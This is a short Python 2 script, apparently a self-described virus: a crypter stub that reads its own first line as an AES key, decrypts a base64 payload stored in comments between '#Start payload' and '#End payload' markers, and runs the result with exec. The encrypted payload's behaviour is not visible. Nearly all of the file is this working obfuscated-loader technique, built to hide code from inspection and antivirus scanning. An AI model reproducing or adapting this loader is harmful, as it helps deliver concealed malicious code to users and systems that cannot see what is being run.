print "HELOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO"



print "lolol"
######################################################## First script python
# coding=utf-8
# Start Uncrypted
import os                        
import __main__                                     
import base64
import sys
import StringIO
from Crypto import Random
from Crypto.Cipher import AES
from Crypto import Random

# Decryption function
def decrypt(data):
   this = open(__main__.__file__, 'r')
   key = this.readline()
   this.close()

   data = base64.b64decode(data);

   iv = Random.new().read(AES.block_size)
   cipher = AES.new(StringIO.StringIO(key).read(24), AES.MODE_CFB, iv)
   
   return cipher.decrypt(data)[16:]

# Gets the virus file
this = open(__main__.__file__, 'r')
copy = False

cipher_payload = ''

for line in this:
   if line.strip() == '#Start payload':
      copy = True
   elif line.strip() == '#End payload':
      copy = False
   elif copy:
      cipher_payload = cipher_payload + line

e = decrypt(cipher_payload[1:])
#e = encrypt(cipher_payload)
print e
exec e
sys.exit('Good job!')
# End Uncrypted
#Start payload
#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
#End payload